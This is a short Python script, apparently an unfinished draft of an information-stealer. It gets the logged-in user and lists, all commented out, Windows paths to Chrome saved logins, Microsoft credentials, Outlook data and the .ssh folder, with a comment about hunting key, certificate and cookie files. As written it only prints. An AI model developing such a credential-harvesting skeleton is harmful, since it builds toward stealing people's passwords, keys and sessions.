def main():
    import os
    # search in all system to get files that finish for example all .rsa files .ssh files .pem files, cookies
#     print("Retrieve sensitive files")

    username = os.getlogin()

    print(f"Current user: {username}")

    listOfSensitiveFiles = [
#         "C:\Users\{username}\AppData\Local\Google\Chrome\User Data\Default\Login Data",
#         "C:\Users\{username}\AppData\Roaming\Microsoft\Credentials",
#         "C:\Users\{username}\AppData\Roaming\Microsoft\Outlook",
#         "C:\Users\{username}\.ssh"
    ]

    for file in listOfSensitiveFiles:
        print(f"File: {file}")

main()